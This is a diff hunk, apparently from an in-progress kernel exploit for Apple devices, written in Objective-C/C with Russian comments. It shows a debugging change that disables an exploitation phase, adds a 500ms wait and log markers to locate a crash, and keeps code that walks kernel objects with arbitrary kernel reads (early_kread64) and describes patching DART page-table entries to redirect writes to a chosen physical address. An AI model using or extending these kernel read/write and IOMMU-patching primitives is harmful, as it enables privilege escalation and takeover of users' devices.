@@ -6624,7 +6624,14 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // жив (bit43=1 в TSD victim'а), ищем DART PTE по PA-маске 0x3FFFE000000
     // (р.33/35), патчим PA-поле с сохранением флаг-бит, второй execute (тот же
     // TSD, reuse) пишет в ctlPA.
-    if (isTable && victim != IO_OBJECT_NULL) {
+    // 1.9.180 ЭКСПЕРИМЕНТ: фаза 2 ОТКЛЮЧЕНА — srcBad victim#1, ждём 500мс, только
+    // маркер. Ребут = убийца в kernel'е (failing op / purge mapping'а, не наши
+    // дерефы). Выживет = наш walk бьёт по переработанному состоянию (тогда
+    // фазу 2 двигаем в окно парка сразу после submit, до 400ms-ожидания).
+    kpNote(r, @"  [P2-LESS] фаза 2 отключена: жду 500ms — если ребут, убийца в kernel'е (scaler/purge)");
+    usleep(500000);
+    kpNote(r, @"  [P2-LESS] 500ms выжили — убийца был в нашем walk, не в kernel-опе");
+    if (0 && isTable && victim != IO_OBJECT_NULL) {
         uint64_t wVA = kpM2TClientVA(r, isTable, victim, @"p2-victim");
         uint64_t ucVA = kpLooksLikeKernelPointer(wVA) ? kp_untag_ptr(early_kread64(wVA + 0x30)) : 0;
         uint64_t provVA = kpLooksLikeKernelPointer(ucVA) ? kp_untag_ptr(early_kread64(ucVA + 0xe8)) : 0;
